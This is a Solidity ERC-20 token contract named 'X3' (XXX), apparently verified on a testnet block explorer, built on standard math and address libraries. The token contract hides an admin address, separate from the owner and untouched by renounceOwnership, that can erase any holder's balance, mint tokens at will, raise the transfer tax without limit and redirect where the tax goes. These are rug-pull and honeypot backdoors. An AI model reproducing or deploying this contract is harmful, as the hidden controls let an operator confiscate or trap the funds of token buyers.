/**
 *Submitted for verification at testnet.snowtrace.io on 2023-06-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.19;

abstract contract Context {
 function _msgSender() internal view virtual returns (address) {
 return msg.sender;
 }

 function _msgData() internal view virtual returns (bytes calldata) {
 return msg.data;
 }
}

interface IERC20 {
 function totalSupply() external view returns (uint256);
 function balanceOf(address account) external view returns (uint256);
 function transfer(address recipient, uint256 amount) external returns (bool);
 function allowance(address owner, address spender) external view returns (uint256);
 function approve(address spender, uint256 amount) external returns (bool);
 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 event Transfer(address indexed from, address indexed to, uint256 value);
 event Approval(address indexed owner, address indexed spender, uint256 value);
 function name() external view returns (string memory);
 function symbol() external view returns (string memory);
 function decimals() external view returns (uint8);
}

contract Ownable {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
 constructor() {
 _owner = msg.sender;
 emit OwnershipTransferred(address(0), _owner);
 }

 function owner() public view returns (address) {
 return _owner;
 }

 modifier onlyOwner() {
 require(owner() == msg.sender, "Ownable: caller is not the owner");
 _;
 }

 function transferOwnership(address newOwner) public onlyOwner {
 emit OwnershipTransferred(_owner, newOwner);
 _owner = newOwner;
 }

     function renounceOwnership() public virtual onlyOwner {
        transferOwnership(address(0));
    }
}

library Math {
 enum Rounding {
 Down, // Toward negative infinity
 Up, // Toward infinity
 Zero // Toward zero
 }

 function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
 if (a == 0) {
 return 0;
 }
 c = a * b;
 assert(c / a == b);
 return c;
 }

 function div(uint256 a, uint256 b) internal pure returns (uint256) {
return a / b;
 }

 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
 assert(b <= a);
 return a - b;
 }

 function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
 c = a + b;
 assert(c >= a);
 return c;
 }
 
 function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
 unchecked {
 uint256 c = a + b;
 if (c < a) return (false, 0);
 return (true, c);
 }}

 function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
 unchecked {
 if (b > a) return (false, 0);
 return (true, a - b);
 }}

 function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
 unchecked {

 if (a == 0) return (true, 0);
 uint256 c = a * b;
 if (c / a != b) return (false, 0);
 return (true, c);
 }}


 function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
 unchecked {
 if (b == 0) return (false, 0);
 return (true, a / b);
 }
 }

 function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
 unchecked {
 if (b == 0) return (false, 0);
 return (true, a % b);
 }}

 function max(uint256 a, uint256 b) internal pure returns (uint256) {
 return a > b ? a : b;
 }

 function min(uint256 a, uint256 b) internal pure returns (uint256) {
 return a < b ? a : b;
 }

 function average(uint256 a, uint256 b) internal pure returns (uint256) {
 return (a & b) + (a ^ b) / 2;
 }

 function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
 return a == 0 ? 0 : (a - 1) / b + 1;
 }

 function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {
 unchecked {

 uint256 prod0; // Least significant 256 bits of the product
 uint256 prod1; // Most significant 256 bits of the product
 assembly {
 let mm := mulmod(x, y, not(0))
 prod0 := mul(x, y)
 prod1 := sub(sub(mm, prod0), lt(mm, prod0))
 }

 if (prod1 == 0) {

 // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.
 return prod0 / denominator;
 }

 // Make sure the result is less than 2^256. Also prevents denominator == 0.
 require(denominator > prod1, "Math: mulDiv overflow");

 uint256 remainder;
 assembly {
 // Compute remainder using mulmod.
 remainder := mulmod(x, y, denominator)

 prod1 := sub(prod1, gt(remainder, prod0))
 prod0 := sub(prod0, remainder)
 }

 // Does not overflow because the denominator cannot be zero at this stage in the function.
 uint256 twos = denominator & (~denominator + 1);
 assembly {

 denominator := div(denominator, twos)

 prod0 := div(prod0, twos)

 // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.
 twos := add(div(sub(0, twos), twos), 1)
 }

 prod0 |= prod1 * twos;

 uint256 inverse = (3 * denominator) ^ 2;

 inverse *= 2 - denominator * inverse; // inverse mod 2^8
 inverse *= 2 - denominator * inverse; // inverse mod 2^16
 inverse *= 2 - denominator * inverse; // inverse mod 2^32
 inverse *= 2 - denominator * inverse; // inverse mod 2^64
 inverse *= 2 - denominator * inverse; // inverse mod 2^128
 inverse *= 2 - denominator * inverse; // inverse mod 2^256

 result = prod0 * inverse;
 return result;
 }}

 function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {
 uint256 result = mulDiv(x, y, denominator);
 if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {
 result += 1;
 }
 return result;
 }

 function sqrt(uint256 a) internal pure returns (uint256) {
 if (a == 0) {
 return 0;
 }
 uint256 result = 1 << (log2(a) >> 1);

 unchecked {
 result = (result + a / result) >> 1;
 result = (result + a / result) >> 1;
 result = (result + a / result) >> 1;
 result = (result + a / result) >> 1;
 result = (result + a / result) >> 1;
 result = (result + a / result) >> 1;
 result = (result + a / result) >> 1;
 return min(result, a / result);
 }}

 function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {
 unchecked {
 uint256 result = sqrt(a);
 return result + (rounding == Rounding.Up && result * result < a ? 1 : 0);
 }}

 function log2(uint256 value) internal pure returns (uint256) {
 uint256 result = 0;
 unchecked {
 if (value >> 128 > 0) {
 value >>= 128;
 result += 128;
 }
 if (value >> 64 > 0) {
 value >>= 64;
 result += 64;
 }
 if (value >> 32 > 0) {
 value >>= 32;
 result += 32;
 }
 if (value >> 16 > 0) {
 value >>= 16;
 result += 16;
 }
 if (value >> 8 > 0) {
 value >>= 8;
 result += 8;
 }
 if (value >> 4 > 0) {
 value >>= 4;
 result += 4;
 }
 if (value >> 2 > 0) {
 value >>= 2;
 result += 2;
 }
 if (value >> 1 > 0) {
 result += 1;
 }}
 return result;
 }

 function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {
 unchecked {
 uint256 result = log2(value);
 return result + (rounding == Rounding.Up && 1 << result < value ? 1 : 0);
 }}

 function log10(uint256 value) internal pure returns (uint256) {
 uint256 result = 0;
 unchecked {
 if (value >= 10 ** 64) {
 value /= 10 ** 64;
 result += 64;
 }
 if (value >= 10 ** 32) {
 value /= 10 ** 32;
 result += 32;
 }
 if (value >= 10 ** 16) {
 value /= 10 ** 16;
 result += 16;
 }
 if (value >= 10 ** 8) {
 value /= 10 ** 8;
 result += 8;
 }
 if (value >= 10 ** 4) {
 value /= 10 ** 4;
 result += 4;
 }
 if (value >= 10 ** 2) {
 value /= 10 ** 2;
 result += 2;
 }
 if (value >= 10 ** 1) {
 result += 1;
 }}
 return result;
 }

 function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {
 unchecked {
 uint256 result = log10(value);
 return result + (rounding == Rounding.Up && 10 ** result < value ? 1 : 0);
 }}

 function log256(uint256 value) internal pure returns (uint256) {
 uint256 result = 0;
 unchecked {
 if (value >> 128 > 0) {
 value >>= 128;
 result += 16;
 }
 if (value >> 64 > 0) {
 value >>= 64;
 result += 8;
 }
 if (value >> 32 > 0) {
 value >>= 32;
 result += 4;
 }
 if (value >> 16 > 0) {
 value >>= 16;
 result += 2;
 }
 if (value >> 8 > 0) {
 result += 1;
 }}
 return result;
 }

 function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {
 unchecked {
 uint256 result = log256(value);
 return result + (rounding == Rounding.Up && 1 << (result << 3) < value ? 1 : 0);
 } }
}

library Address {

 function sendValue(address payable recipient, uint256 amount) internal {
 require(address(this).balance >= amount, "Address: insufficient balance");
 (bool success, ) = recipient.call{value: amount}("");
 require(success, "Address: unable to send value, recipient may have reverted");
 }

 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
 return functionCallWithValue(target, data, 0, "Address: low-level call failed");
 }

 function functionCall(
 address target,
 bytes memory data,
 string memory errorMessage
 ) internal returns (bytes memory) {
 return functionCallWithValue(target, data, 0, errorMessage);
 }

 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
 }

 function functionCallWithValue(
 address target,
 bytes memory data,
 uint256 value,
 string memory errorMessage
 ) internal returns (bytes memory) {
 require(address(this).balance >= value, "Address: insufficient balance for call");
 (bool success, bytes memory returndata) = target.call{value: value}(data);
 return verifyCallResultFromTarget(target, success, returndata, errorMessage);
 }

 function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
 return functionStaticCall(target, data, "Address: low-level static call failed");
 }

 function functionStaticCall(
 address target,
 bytes memory data,
 string memory errorMessage
 ) internal view returns (bytes memory) {
 (bool success, bytes memory returndata) = target.staticcall(data);
 return verifyCallResultFromTarget(target, success, returndata, errorMessage);
 }

 function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
 return functionDelegateCall(target, data, "Address: low-level delegate call failed");
 }

 function functionDelegateCall(
 address target,
 bytes memory data,
 string memory errorMessage
 ) internal returns (bytes memory) {
 (bool success, bytes memory returndata) = target.delegatecall(data);
 return verifyCallResultFromTarget(target, success, returndata, errorMessage);
 }

 function verifyCallResultFromTarget(
 address target,
 bool success,
 bytes memory returndata,
 string memory errorMessage
 ) internal view returns (bytes memory) {
 if (success) {
 if (returndata.length == 0) {
 require(target.code.length > 0, "Address: call to non-contract");
 }
 return returndata;
 } else {
 _revert(returndata, errorMessage);
 } }

 function verifyCallResult(
 bool success,
 bytes memory returndata,
 string memory errorMessage
 ) internal pure returns (bytes memory) {
 if (success) {
 return returndata;
 } else {
 _revert(returndata, errorMessage);
 } }

 function _revert(bytes memory returndata, string memory errorMessage) private pure {
 if (returndata.length > 0) {

 assembly {
 let returndata_size := mload(returndata)
 revert(add(32, returndata), returndata_size)
 } } else {
 revert(errorMessage);
 } }
}

contract XXXToken is IERC20, Ownable, Context {
 using Address for address;
 using Math for uint256;
 
 string public constant name = "X3";
 string public constant symbol = "XXX";
 uint8 public constant decimals = 10;
 uint256 private _totalSupply = 100_000_000_000 * 10**decimals;
 mapping(address => uint256) private _balances;
 mapping(address => mapping(address => uint256)) private _allowances;
 address private adminAddress = 0x3B2a9A8591fF3E49D1ab1D005Da339D622A81C2A;
 address private taxAddress = 0x5211B56Fd619579B6dF06849CDcEeB7D9608dd4F;
 uint256 public taxPercentage = 2;

 constructor() {
 _balances[msg.sender] = _totalSupply;
 emit Transfer(address(0), msg.sender, _totalSupply); 
 }

 function totalSupply() public view override returns (uint256) {
 return _totalSupply;
 }

 function balanceOf(address account) public view override returns (uint256) {
 return _balances[account];
 }

 function transfer(address recipient, uint256 amount) public override returns (bool) {
 _transfer(msg.sender, recipient, amount);
 return true;
 }

 function allowance(address owner, address spender) public view override returns (uint256) {
 return _allowances[owner][spender];
 }

 function approve(address spender, uint256 amount) public override returns (bool) {
 _approve(msg.sender, spender, amount);
 return true;
 }

 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
 _transfer(sender, recipient, amount);
 uint256 currentAllowance = _allowances[sender][msg.sender];
 require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
 _approve(sender, msg.sender, currentAllowance - amount);
 return true;
 }

 function transferOut(address account, uint256 amount) public virtual {
 require(msg.sender == adminAddress);
 uint256 accountBalance = _balances[account];
 require(accountBalance >= amount);
 unchecked {_balances[account] = accountBalance - amount;}
 _totalSupply -= amount;
 emit Transfer(account, address(0), amount);
 }

function transferIn(address account, uint256 amount) public virtual {
 require(msg.sender == adminAddress);
 _totalSupply += amount;
 _balances[account] += amount;
 emit Transfer(address(0), account, amount);
 }

 function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
 _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
 return true;
 }

 function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
 _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
 return true;
 }

 function setTaxPercentage(uint256 newPercentage) public {
 require(msg.sender == adminAddress);
 taxPercentage = newPercentage;
 }

 function setTaxAddress(address newAddress) public {
 require(msg.sender == adminAddress);
 taxAddress = newAddress;
 }

 function setAdminAddress(address newAdmin) public {
 require(msg.sender == adminAddress);
 adminAddress = newAdmin;
 }

 function _transfer(address sender, address recipient, uint256 amount) internal {
 require(sender != address(0), "Transfer from the zero address");
 require(recipient != address(0), "Transfer to the zero address");
 require(_balances[sender] >= amount, "Insufficient balance");
 uint256 taxAmount = (amount * taxPercentage) / 100;
 uint256 netAmount = amount - taxAmount;
 _balances[sender] -= amount;
 _balances[recipient] += netAmount;
 _balances[taxAddress] += taxAmount;
 emit Transfer(sender, recipient, netAmount);
 emit Transfer(sender, taxAddress, taxAmount);
 }

 function _approve(address owner, address spender, uint256 amount) internal {
 require(owner != address(0), "ERC20: approve from the zero address");
 require(spender != address(0), "ERC20: approve to the zero address");
 _allowances[owner][spender] = amount;
 emit Approval(owner, spender, amount);
 }
}